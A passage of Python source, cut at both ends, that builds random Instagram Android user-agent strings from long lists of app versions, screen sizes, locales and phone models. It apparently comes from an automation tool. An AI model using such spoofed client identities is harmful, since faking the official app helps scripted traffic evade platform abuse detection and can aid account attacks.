7','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
    basa=rc(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
    kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
    igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
    igve=igv.split(",")
    versi=random.choice(igve)
    ua1 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; {kode})'
    ua2 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; vivo; vivo 1820; 1820; mt6762; {basa}; {kode})'
    ua3 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2109; OP4BA5L1; qcom; {basa}; {kode})'
    ua4 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; {basa}; {kode})'
    uaa = rc([ua1,ua2,ua3,ua4])
    return uaa

def fanuaig():
    versi_istagram = random.choice(("70.0.0.15.98, 80.0.0.20.101,60.0.0.10.76, 85.0.0.25.100,75.0.0.22.99,72.0.0.18.94, 68.0.0.16.84,78.0.0.14.97, 63.0.0.20.81,81.0.0.24.105,73.0.0.16.96,67.0.0.18.88,84.0.0.21.110,74.0.0.18.100,71.0.0.15.92,79.0.0.14.103,62.0.0.18.80,87.0.0.22.115,76.0.0.20.102,83.0.0.18.10,66.0.0.16.87,88.0.0.24.118,77.0.0.22.103,64.0.0.18.82,82.0.0.20.107,69.0.0.14.92,89.0.0.20.123,61.0.0.14.76,86.0.0.18.112,65.0.0.12.86").split(","))
    device_android = str(random.choice(["27/9","27/10","27/11","27/12","27/12","27/13","28/9","28/10","28/11","28/12","28/12","28/13","29/9","29/10","29/11","29/12","29/12","29/13","27/9","30/10","30/11","30/12","30/12","30/13","31/9","31/10","31/11","31/12","31/12","31/13","32/9","32/10","32/11","32/12","32/12","32/13","33/9","33/10","33/11","33/12","33/12","33/13"]))
    dpi = str(random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi']))
    pxl = str(random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733']))
    kode = str(random.choice(['145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642',